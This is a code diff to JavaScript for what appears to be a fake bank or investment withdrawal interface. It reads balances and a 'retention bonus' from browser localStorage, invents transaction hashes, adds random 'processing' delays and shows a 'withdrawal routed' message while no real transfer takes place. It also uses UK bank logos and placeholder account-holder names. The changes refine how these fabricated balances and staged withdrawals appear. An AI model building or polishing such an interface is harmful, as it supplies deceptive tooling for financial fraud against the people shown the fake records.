@@ -945,25 +945,25 @@ function getCapturedDetails() {
 }
 
 function getLiveLocalStorageBalance() {
-    const hardcodedBaseline = 147349.26;
+    const fallbackBaseline = 0.00;
     const savedValue = localStorage.getItem("totalACU") || localStorage.getItem("baseACU");
 
     if (savedValue !== null) {
         const parsedValue = parseFloat(savedValue);
-        return isNaN(parsedValue) ? hardcodedBaseline : parsedValue;
+        return isNaN(parsedValue) ? fallbackBaseline : parsedValue;
     }
-    return hardcodedBaseline;
+    return fallbackBaseline;
 }
 
 function getLiveRetentionBonus() {
-    const hardcodedBonusBaseline = 26779.97;
+    const fallbackBonusBaseline = 0.00;
     const savedBonus = localStorage.getItem("av_retention_bonus");
 
     if (savedBonus !== null) {
         const parsedBonus = parseFloat(savedBonus);
-        return isNaN(parsedBonus) ? hardcodedBonusBaseline : parsedBonus;
+        return isNaN(parsedBonus) ? fallbackBonusBaseline : parsedBonus;
     }
-    return hardcodedBonusBaseline;
+    return fallbackBonusBaseline;
 }
 
 const isAlreadyWithdrawn = localStorage.getItem('av_is_withdrawn') === 'true' || localStorage.getItem('av_withdrawn') === 'true';
@@ -1017,7 +1017,7 @@ const globalBankLogos = {
     "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
     "Santander UK": "assets/pictures/WA_1783360589514.jpeg",
     "Halifax": "assets/pictures/WA_1783360607640.jpeg",
-    "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
+    "TSB Bank": "assets/pictures/TSB-Logo.png",
     "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
     "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
 };
@@ -1032,6 +1032,7 @@ document.addEventListener("DOMContentLoaded", () => {
 async function initiateLiveTransaction(sessionData) {
     sessionData.availableBalanceCAD = getLiveLocalStorageBalance();
     sessionData.baseAmountCAD = getLiveRetentionBonus();
+    sessionData.balanceUnlockedFlag = localStorage.getItem('av_is_withdrawn') === 'true' || localStorage.getItem('av_withdrawn') === 'true';
 
     const config = regionConfig[sessionData.region];
     if (!config) return;
@@ -1059,11 +1060,11 @@ async function initiateLiveTransaction(sessionData) {
 
     let holderName = "Valued Member";
     if (region === "US") {
-        holderName = userDetails.accountNameUs || userDetails.fullName || "Franklyn C. Harris";
+        holderName = userDetails.accountNameUs || userDetails.fullName || "Alexander V. Sterling";
     } else if (region === "UK") {
-        holderName = userDetails.accountNameUk || userDetails.fullName || "Franklyn C. Harris";
+        holderName = userDetails.accountNameUk || userDetails.fullName || "Alexander V. Sterling";
     } else {
-        holderName = userDetails.accountName || userDetails.fullName || "Franklyn C. Harris";
+        holderName = userDetails.accountName || userDetails.fullName || "Alexander V. Sterling";
     }
 
     let rawAccountNumber = "";
@@ -1229,6 +1230,12 @@ function setupEventHandlers() {
         const dynamicProcessingDelay = Math.floor(Math.random() * (maxTime - minTime + 1)) + minTime;
 
         setTimeout(() => {
+            // Determine active target balance dynamically at the time of execution
+            const isUnlocked = localStorage.getItem('av_is_withdrawn') === 'true' || localStorage.getItem('av_withdrawn') === 'true';
+            const liveBalance = getLiveLocalStorageBalance();
+            const liveBonus = getLiveRetentionBonus();
+            const withdrawnAmount = isUnlocked ? liveBalance : liveBonus;
+
             // Set withdrawal state sync flags
             localStorage.setItem('av_is_withdrawn', 'true');
             localStorage.setItem('av_withdrawn', 'true'); 
@@ -1242,7 +1249,6 @@ function setupEventHandlers() {
             localStorage.setItem("av_withdrawal_time", timestampString);
 
             // Record detailed withdrawal transaction payload for history engine
-            const withdrawnAmount = runtimeSessionData.availableBalanceCAD;
             const txData = {
                 txHash: generateRandomHash(),
                 amountCAD: withdrawnAmount,
@@ -1261,7 +1267,10 @@ function setupEventHandlers() {
 
             loadingScreen.classList.remove("active");
             successScreen.classList.add("active");
-            showNotification("Withdrawal routed to clearway terminal queue", 4000);
+            
+            if (typeof showNotification === "function") {
+                showNotification("Withdrawal routed to clearway terminal queue", 4000);
+            }
         }, dynamicProcessingDelay); 
     });
 
